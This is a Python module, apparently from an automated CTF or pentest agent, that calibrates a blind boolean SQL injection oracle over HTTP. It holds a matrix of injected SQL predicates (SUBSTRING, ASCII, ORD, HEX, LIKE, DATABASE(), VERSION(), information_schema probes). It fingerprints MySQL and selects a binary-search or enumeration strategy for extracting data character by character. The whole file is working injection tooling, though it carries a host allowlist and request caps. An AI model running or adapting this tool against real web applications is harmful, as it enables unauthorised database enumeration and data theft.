"""Bounded expression-oracle calibration over the verified Web predicate.

The calibration executor never connects to a database.  It reuses the
request and predicate suffix recovered from a completed Boolean comparison,
then tests paired TRUE/FALSE expressions in a fixed, alternating order.
"""

from __future__ import annotations

import hashlib
import json
import uuid
from copy import deepcopy
from datetime import UTC, datetime
from typing import Any

from fastapi import HTTPException

from app.executors.http_executor import execute_http
from app.executors.sql_automation import _extract_json_path, _signature
from app.executors.target_allowlist import target_allowed
from app.models import JobRequest
from app.workspace.paths import workspace_for

MAX_TEMPLATES = 32
MAX_REQUESTS = 240
DEFAULT_ALLOWED_CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-:.@"
DEFAULT_MATRIX = [
    {"level": 0, "name": "literal_boolean", "true": "1=1", "false": "1=2", "capability": "boolean_predicate_oracle_confirmed"},
    {"level": 1, "name": "arithmetic", "true": "(1+1)=2", "false": "(1+1)=3", "capability": "expression_oracle_confirmed"},
    {"level": 2, "name": "length", "primitive": "length", "true": "LENGTH('ABC')=3", "false": "LENGTH('ABC')=4", "capability": "string_length_supported", "function": "LENGTH"},
    {"level": 2, "name": "char_length", "primitive": "length", "true": "CHAR_LENGTH('ABC')=3", "false": "CHAR_LENGTH('ABC')=4", "capability": "string_length_supported", "function": "CHAR_LENGTH"},
    {"level": 2, "name": "substring", "primitive": "substring", "true": "SUBSTRING('ABC',1,1)='A'", "false": "SUBSTRING('ABC',1,1)='B'", "capability": "substring_supported", "function": "SUBSTRING"},
    {"level": 2, "name": "substr", "primitive": "substring", "true": "SUBSTR('ABC',1,1)='A'", "false": "SUBSTR('ABC',1,1)='B'", "capability": "substring_supported", "function": "SUBSTR"},
    {"level": 2, "name": "mid", "primitive": "substring", "true": "MID('ABC',1,1)='A'", "false": "MID('ABC',1,1)='B'", "capability": "substring_supported", "function": "MID"},
    {"level": 2, "name": "left", "primitive": "substring", "true": "LEFT('ABC',1)='A'", "false": "LEFT('ABC',1)='B'", "capability": "substring_supported", "function": "LEFT"},
    {"level": 2, "name": "ascii", "primitive": "ascii", "true": "ASCII('A')=65", "false": "ASCII('A')=66", "capability": "ascii_supported", "function": "ASCII"},
    {"level": 2, "name": "ascii_lowercase", "primitive": "ascii", "true": "ascii('A')=65", "false": "ascii('A')=66", "capability": "ascii_supported", "function": "ascii"},
    {"level": 2, "name": "ascii_scalar_subquery", "primitive": "ascii", "true": "ASCII((SELECT 'A'))=65", "false": "ASCII((SELECT 'A'))=66", "capability": "ascii_supported", "function": "ASCII"},
    {"level": 2, "name": "ascii_substring", "primitive": "ascii", "true": "ASCII(SUBSTRING('ABC',1,1))=65", "false": "ASCII(SUBSTRING('ABC',1,1))=66", "capability": "ascii_supported", "function": "ASCII"},
    {"level": 2, "name": "ord", "primitive": "ord", "true": "ORD('A')=65", "false": "ORD('A')=66", "capability": "ord_supported", "function": "ORD"},
    {"level": 2, "name": "ord_substring", "primitive": "ord", "true": "ORD(SUBSTRING('ABC',1,1))=65", "false": "ORD(SUBSTRING('ABC',1,1))=66", "capability": "ord_supported", "function": "ORD"},
    {"level": 2, "name": "hex", "primitive": "hex", "true": "HEX('A')='41'", "false": "HEX('A')='42'", "capability": "hex_supported", "function": "HEX"},
    {"level": 2, "name": "hex_substring", "primitive": "hex", "true": "HEX(SUBSTRING('ABC',1,1))='41'", "false": "HEX(SUBSTRING('ABC',1,1))='42'", "capability": "hex_supported", "function": "HEX"},
    {"level": 2, "name": "conv_hex", "primitive": "conv", "true": "CONV(HEX('A'),16,10)=65", "false": "CONV(HEX('A'),16,10)=66", "capability": "numeric_character_binary_search_supported", "function": "CONV"},
    {"level": 2, "name": "like", "primitive": "like", "true": "'ABC' LIKE 'A%'", "false": "'ABC' LIKE 'B%'", "capability": "prefix_like_supported", "function": "LIKE"},
    {"level": 2, "name": "database_like", "primitive": "like", "true": "DATABASE() LIKE '%'", "false": "DATABASE() LIKE '__c7f_impossible_prefix__%'", "capability": "prefix_like_supported", "function": "LIKE"},
    {"level": 2, "name": "strcmp", "primitive": "strcmp", "true": "STRCMP('A','A')=0", "false": "STRCMP('A','B')=0", "capability": "direct_character_comparison_supported", "function": "STRCMP"},
    {"level": 2, "name": "strcmp_substring", "primitive": "strcmp", "true": "STRCMP(SUBSTRING('ABC',1,1),'A')=0", "false": "STRCMP(SUBSTRING('ABC',1,1),'B')=0", "capability": "direct_character_comparison_supported", "function": "STRCMP"},
    {"level": 3, "name": "scalar_subquery", "true": "(SELECT 1)=1", "false": "(SELECT 1)=2", "capability": "scalar_subquery_oracle_confirmed"},
    {"level": 3, "name": "exists_subquery", "true": "EXISTS(SELECT 1)", "false": "EXISTS(SELECT 1 WHERE 1=2)", "capability": "scalar_subquery_oracle_confirmed"},
    {"level": 4, "name": "mysql_database", "true": "DATABASE() IS NOT NULL", "false": "DATABASE() IS NULL", "capability": "mysql_dbms_confirmed"},
    {"level": 4, "name": "mysql_version", "true": "VERSION() IS NOT NULL", "false": "VERSION() IS NULL", "capability": "mysql_dbms_confirmed"},
    {"level": 4, "name": "mysql_version_comment", "true": "@@version_comment IS NOT NULL", "false": "@@version_comment IS NULL", "capability": "mysql_dbms_confirmed"},
    {"level": 5, "name": "information_schema_exists", "primitive": "information_schema", "true": "EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema=DATABASE())", "false": "EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema='__c7f_nonexistent_schema__')", "capability": "mysql_information_schema_oracle_confirmed"},
    {"level": 5, "name": "information_schema_count", "primitive": "information_schema", "true": "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())>0", "false": "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='__c7f_nonexistent_schema__')>0", "capability": "mysql_information_schema_oracle_confirmed"},
]


def _base_spec(args: dict[str, Any]) -> dict[str, Any]:
    raw = args.get("request") if isinstance(args.get("request"), dict) else args
    spec = deepcopy(raw)
    spec["url"] = str(spec.get("url") or "")
    spec["method"] = str(spec.get("method") or "POST").upper()
    spec["headers"] = dict(spec.get("headers") or {})
    return spec


def _put_field(spec: dict[str, Any], field: str, value: str) -> dict[str, Any]:
    result = deepcopy(spec)
    container = "json" if isinstance(result.get("json"), dict) else "form" if isinstance(result.get("form"), dict) else "query"
    payload = dict(result.get(container) or {})
    payload[field] = value
    result[container] = payload
    return result


def _validate(args: dict[str, Any], request: JobRequest) -> tuple[dict[str, Any], str, str, dict[str, Any], str, list[dict[str, Any]]]:
    spec = _base_spec(args)
    field = str(args.get("test_field") or "")
    baseline = str(args.get("baseline_value") or "")
    oracle = dict(args.get("oracle") or {})
    template = str(args.get("predicate_template") or "")
    if not spec["url"] or not field or not template or "{predicate}" not in template:
        raise HTTPException(422, detail="ORACLE_CALIBRATION_CONTRACT_REQUIRED")
    if not target_allowed(spec["url"], request.allowed_hosts):
        raise HTTPException(403, detail="Oracle calibration target is not allowlisted")
    if not oracle.get("json_field"):
        raise HTTPException(422, detail="ORACLE_CALIBRATION_ORACLE_REQUIRED")
    matrix = args.get("matrix") if isinstance(args.get("matrix"), list) else DEFAULT_MATRIX
    if not matrix:
        raise HTTPException(422, detail="ORACLE_CALIBRATION_MATRIX_REQUIRED")
    return spec, field, baseline, oracle, template, [dict(item) for item in matrix if isinstance(item, dict)]


def _oracle_value(result: dict[str, Any], oracle: dict[str, Any]) -> tuple[bool | None, bool]:
    body = str(result.get("body") or result.get("body_excerpt") or "")
    value = _extract_json_path(result, str(oracle.get("json_field") or ""))
    present = value is not None
    if value == oracle.get("true_value", True):
        return True, present
    if value == oracle.get("false_value", False):
        return False, present
    return None, present


def _digest(value: Any) -> str:
    return hashlib.sha256(json.dumps(value, ensure_ascii=False, sort_keys=True, default=str).encode()).hexdigest()


async def oracle_expression_calibration(request: JobRequest) -> dict[str, Any]:
    args = dict(request.arguments)
    spec, field, baseline, oracle, template, matrix = _validate(args, request)
    skip_levels = {int(level) for level in (args.get("skip_levels") or []) if str(level).lstrip("-").isdigit()}
    matrix = [item for item in matrix if int(item.get("level") or 0) not in skip_levels]
    repeats = min(max(int(args.get("repeats_per_expression") or 2), 2), 2)
    max_requests = min(max(int(args.get("max_calibration_requests") or 160), 1), MAX_REQUESTS)
    job_id = str(args.get("job_id") or uuid.uuid4())
    root = workspace_for(request.run_id)
    output = root / "outputs" / "oracle-calibration" / job_id
    evidence = root / "evidence" / "oracle-calibration" / job_id
    output.mkdir(parents=True, exist_ok=True)
    evidence.mkdir(parents=True, exist_ok=True)
    result_path = output / "result.json"
    progress_path = output / "progress.jsonl"
    checkpoint_path = output / "checkpoint.json"
    contract_path = evidence / "request-contract.json"
    contract = {
        "run_id": request.run_id,
        "job_id": job_id,
        "request": spec,
        "test_field": field,
        "baseline_value": baseline,
        "control_fields": dict(args.get("control_fields") or {}),
        "oracle": oracle,
        "predicate_template": template,
        "repeats_per_expression": repeats,
        "max_calibration_requests": max_requests,
        "matrix": matrix,
        "skip_levels": sorted(skip_levels),
        "existing_profile": args.get("existing_profile") if isinstance(args.get("existing_profile"), dict) else None,
        "session_isolation": True,
    }
    contract_path.write_text(json.dumps(contract, ensure_ascii=False, indent=2), encoding="utf-8")
    observations: list[dict[str, Any]] = []
    grouped: dict[str, list[dict[str, Any]]] = {}
    request_count = 0
    calibration_trace = f"oracle-calibration-{job_id}"

    async def send(label: str, expression: str) -> dict[str, Any]:
        nonlocal request_count
        if request_count >= max_requests:
            raise RuntimeError("MAX_CALIBRATION_REQUESTS_REACHED")
        request_count += 1
        candidate = _put_field(spec, field, baseline + template.replace("{predicate}", expression))
        for key, value in dict(args.get("control_fields") or {}).items():
            candidate = _put_field(candidate, str(key), str(value))
        headers = dict(candidate.get("headers") or {})
        headers["X-CTF-Calibration-Trace"] = calibration_trace
        candidate["headers"] = headers
        result = await execute_http(request.model_copy(update={"tool": "http_request", "arguments": candidate}))
        value, present = _oracle_value(result, oracle)
        signature = _signature(result)
        row = {"label": label, "expression": expression, "payload": baseline + template.replace("{predicate}", expression), "oracle_value": value, "matched_present": present, "signature": signature, "error_indicator": bool(result.get("error") or result.get("error_code")), "cache_indicator": False, "request_index": request_count}
        observations.append(row)
        grouped.setdefault(label, []).append(row)
        progress_path.write_text("".join(json.dumps(item, ensure_ascii=False) + "\n" for item in observations), encoding="utf-8")
        return row

    failures: list[dict[str, Any]] = []
    try:
        for item in matrix[:MAX_TEMPLATES]:
            name = str(item.get("name") or f"level-{item.get('level', 0)}")
            true_expr = str(item.get("true") or "")
            false_expr = str(item.get("false") or "")
            if not true_expr or not false_expr:
                continue
            rows: list[dict[str, Any]] = []
            for label, expression in (("TRUE", true_expr), ("FALSE", false_expr), ("FALSE", false_expr), ("TRUE", true_expr)):
                rows.append(await send(label, expression))
            true_rows = [row for row in rows if row["label"] == "TRUE"]
            false_rows = [row for row in rows if row["label"] == "FALSE"]
            true_values = [row["oracle_value"] for row in true_rows]
            false_values = [row["oracle_value"] for row in false_rows]
            stable = len(set(json.dumps(row["signature"], sort_keys=True) for row in true_rows + false_rows)) > 0 and len({json.dumps(row["signature"], sort_keys=True) for row in true_rows}) == 1 and len({json.dumps(row["signature"], sort_keys=True) for row in false_rows}) == 1
            passed = stable and all(value == oracle.get("true_value", True) for value in true_values) and all(value == oracle.get("false_value", False) for value in false_values) and true_rows[0]["signature"] != false_rows[0]["signature"] and not any(row["error_indicator"] for row in rows)
            entry = {"level": int(item.get("level") or 0), "name": name, "primitive": item.get("primitive") or name, "function": item.get("function"), "true_expression": true_expr, "false_expression": false_expr, "true_signature": true_rows[0]["signature"], "false_signature": false_rows[0]["signature"], "repeat_count": len(rows), "stable": stable, "passed": passed, "capability": item.get("capability")}
            if not passed:
                same_signature = true_rows[0]["signature"] == false_rows[0]["signature"]
                ascii_token = "ascii" in f"{true_expr} {false_expr}".lower()
                if same_signature and ascii_token:
                    entry["classification"] = "ASCII_TOKEN_FILTERED"
                    error_code = "ASCII_TOKEN_FILTERED"
                elif ascii_token:
                    entry["classification"] = "ASCII_FUNCTION_UNSUPPORTED"
                    error_code = "ASCII_FUNCTION_UNSUPPORTED"
                elif same_signature:
                    entry["classification"] = "NO_DISCRIMINATING_SIGNAL"
                    error_code = "NO_DISCRIMINATING_SIGNAL"
                else:
                    entry["classification"] = "PRIMITIVE_UNSUPPORTED"
                    error_code = "PRIMITIVE_UNSUPPORTED"
                failures.append({"level": entry["level"], "name": name, "error_code": error_code, "entry": entry})
            grouped.setdefault("matrix", []).append(entry)
        entries = grouped.get("matrix", [])
        by_level = {level: [row for row in entries if int(row["level"]) == level] for level in sorted({int(row["level"]) for row in entries})}
        passed = lambda level: any(row.get("passed") is True for row in by_level.get(level, []))
        primitive = {str(row.get("primitive") or row.get("name")): row for row in entries}
        passed_rows = [row for row in entries if row.get("passed") is True]
        ascii_supported = any(row.get("passed") and str(row.get("primitive")) == "ascii" for row in entries)
        ord_supported = any(row.get("passed") and str(row.get("primitive")) == "ord" for row in entries)
        hex_supported = any(row.get("passed") and str(row.get("primitive")) == "hex" for row in entries)
        conv_supported = any(row.get("passed") and str(row.get("primitive")) == "conv" for row in entries)
        substring_supported = any(row.get("passed") and str(row.get("primitive")) == "substring" for row in entries)
        direct_supported = any(
            row.get("passed") and str(row.get("primitive")) in {"substring", "strcmp"}
            for row in entries
        )
        like_supported = any(row.get("passed") and str(row.get("primitive")) == "like" for row in entries)
        length_row = next((row for row in entries if row.get("passed") and row.get("name") in {"length", "char_length"}), None)
        substring_row = next((row for row in entries if row.get("passed") and str(row.get("primitive")) == "substring"), None)
        numeric_function = "ORD" if ord_supported else "CONV" if conv_supported else "ASCII" if ascii_supported else None
        if ord_supported and substring_supported:
            extraction_strategy = "ORD_BINARY_SEARCH"
        elif conv_supported and substring_supported:
            extraction_strategy = "HEX_BINARY_SEARCH"
        elif ascii_supported and substring_supported:
            extraction_strategy = "ASCII_BINARY_SEARCH"
        elif substring_supported and direct_supported:
            extraction_strategy = "DIRECT_CHARACTER_ENUMERATION"
        elif hex_supported and substring_supported:
            # HEX can still be used as a bounded equality oracle when CONV is
            # unavailable; the compiler records this explicitly so the
            # Runner does not silently fall back to a numeric primitive.
            extraction_strategy = "DIRECT_CHARACTER_ENUMERATION"
        elif like_supported:
            extraction_strategy = "PREFIX_LIKE_ENUMERATION"
        else:
            extraction_strategy = None
        profile = None
        if extraction_strategy:
            profile_seed = {"run_id": request.run_id, "template": template, "strategy": extraction_strategy, "entries": [row.get("name") for row in passed_rows]}
            profile = {
                "profile_id": "AEP-" + _digest(profile_seed)[:16],
                "run_id": request.run_id,
                "predicate_template": template,
                "length_function": (length_row or {}).get("function"),
                "substring_function": (substring_row or {}).get("function"),
                "numeric_function": numeric_function,
                "hex_function": "HEX" if hex_supported else None,
                "comparison_strategy": "DIRECT_EQUALITY" if direct_supported else "HEX_EQUALITY" if hex_supported and substring_supported else "PREFIX_LIKE" if like_supported else None,
                "extraction_strategy": extraction_strategy,
                "ascii_supported": ascii_supported,
                "ord_supported": ord_supported,
                "hex_supported": hex_supported,
                "conv_supported": conv_supported,
                "like_supported": like_supported,
                "strcmp_supported": any(row.get("passed") and str(row.get("primitive")) == "strcmp" for row in entries),
                "scalar_subquery_supported": passed(3),
                "allowed_charset": str(args.get("allowed_charset") or DEFAULT_ALLOWED_CHARSET),
                "max_length": min(max(int(args.get("max_length") or 128), 1), 256),
                "requests_per_character_limit": min(max(int(args.get("requests_per_character_limit") or 70), 1), 100),
                "supporting_evidence_ids": list(args.get("supporting_evidence_ids") or []),
                "calibration_tool_call_id": str(args.get("calibration_tool_call_id") or ""),
            }
        if profile is None and isinstance(args.get("existing_profile"), dict) and args["existing_profile"].get("extraction_strategy"):
            profile = dict(args["existing_profile"])
        level_flags = {str(level): passed(level) for level in sorted(by_level)}
        level_flags["2"] = bool(profile)
        capabilities = {
            "string_length_supported": bool(length_row),
            "substring_supported": substring_supported,
            "direct_character_comparison_supported": direct_supported,
            "ascii_supported": ascii_supported,
            "ord_supported": ord_supported,
            "hex_supported": hex_supported,
            "prefix_like_supported": like_supported,
            "numeric_character_binary_search_supported": bool(ascii_supported or ord_supported or conv_supported),
                "bounded_character_enumeration_supported": bool(profile and (direct_supported or like_supported or (hex_supported and substring_supported))),
            "scalar_subquery_oracle_confirmed": passed(3),
            "mysql_dbms_confirmed": passed(4),
            "mysql_information_schema_oracle_confirmed": passed(5),
            "scalar_function_oracle_confirmed": bool(length_row or substring_row or profile),
            "character_extraction_oracle_confirmed": bool(profile),
        }
        if profile:
            status, error_code = "COMPLETED", None
        elif any(int(row.get("level") or 0) == 2 for row in entries):
            status, error_code = "PARTIAL", "NO_CHARACTER_EXTRACTION_PRIMITIVE"
        elif failures and all(item["error_code"] == "NO_DISCRIMINATING_SIGNAL" for item in failures):
            status, error_code = "NO_SIGNAL", "NO_DISCRIMINATING_SIGNAL"
        elif entries:
            status, error_code = "PARTIAL", "NO_CHARACTER_EXTRACTION_PRIMITIVE"
        else:
            status, error_code = "NO_SIGNAL", "NO_DISCRIMINATING_SIGNAL"
        ascii_failure = next((failure for failure in failures if failure["error_code"] == "ASCII_TOKEN_FILTERED"), None)
        structured = {"status": status, "database_engine": "mysql" if passed(4) else "unknown", "calibration_matrix": entries, "levels": level_flags, "capabilities": capabilities, "adaptive_extraction_profile": profile, "primitive_failures": failures, "ascii_failure_classification": "ASCII_TOKEN_FILTERED" if ascii_failure else ("ASCII_FUNCTION_UNSUPPORTED" if any("ascii" in str(item.get("name", "")).lower() for item in failures) else None), "predicate_template": template, "request_contract": contract, "observations": observations, "requests": request_count, "max_calibration_requests": max_requests, "error_code": error_code, "direct_database_connection": False}
        payload = {"status": "COMPLETED", "summary": "Expression Oracle calibration completed" if status == "COMPLETED" else "Expression Oracle calibration produced a bounded calibration result", "structured_result": structured, "error_code": error_code, "artifact_paths": [str(result_path.relative_to(root)).replace("\\", "/"), str(progress_path.relative_to(root)).replace("\\", "/"), str(checkpoint_path.relative_to(root)).replace("\\", "/"), str(contract_path.relative_to(root)).replace("\\", "/")], "result_path": str(result_path.relative_to(root)).replace("\\", "/")}
        result_path.write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")
        checkpoint_path.write_text(json.dumps({"status": status, "requests": request_count, "levels": level_flags, "error_code": error_code, "request_hash": _digest(spec)}, ensure_ascii=False, indent=2), encoding="utf-8")
        return payload
    except RuntimeError as error:
        error_code = str(error)
        payload = {"status": "FAILED", "summary": "Expression Oracle calibration request budget exhausted", "structured_result": {"status": "PARTIAL", "observations": observations, "requests": request_count, "error_code": error_code, "predicate_template": template}, "error_code": error_code, "artifact_paths": [str(progress_path.relative_to(root)).replace("\\", "/"), str(checkpoint_path.relative_to(root)).replace("\\", "/"), str(contract_path.relative_to(root)).replace("\\", "/")]}
        checkpoint_path.write_text(json.dumps({"status": "PARTIAL", "requests": request_count, "error_code": error_code}, ensure_ascii=False, indent=2), encoding="utf-8")
        return payload
